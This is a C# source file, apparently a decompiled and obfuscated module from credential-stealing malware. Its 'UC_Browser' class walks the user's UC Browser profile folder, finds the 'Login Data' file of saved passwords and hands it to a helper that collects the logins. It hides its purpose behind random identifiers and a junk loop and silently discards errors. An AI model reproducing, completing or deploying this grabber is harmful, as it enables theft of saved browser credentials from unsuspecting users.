using System;
using System.Collections.Generic;
using System.IO;
using C6Zy;
using UCgTB4iR;

namespace rk937aHHc
{
	public class UC_Browser : EtbH
	{
		public UC_Browser()
		{
			this.YvAEJFzV = "UC Browser";
		}
		public string YvAEJFzV { get; set; }

		public List<WTitxI2m> Grab()
		{
			int num = 0;
			do
			{
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 1);
			List<WTitxI2m> result;
			try
			{
				string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "UCBrowser\\");
				string hrmkPjLhMLY = "";
				foreach (string text in Directory.GetFiles(path, "*", SearchOption.AllDirectories))
				{
					if (text.Contains("Login Data") & !text.EndsWith("journal"))
					{
						hrmkPjLhMLY = text;
						break;
					}
				}
				result = UCgTB4iR.SetupDataLists.8PquFLl3p(hrmkPjLhMLY, this.YvAEJFzV, "wow_logins");
			}
			catch
			{
				result = new List<WTitxI2m>();
			}
			return result;
		}
	}
}
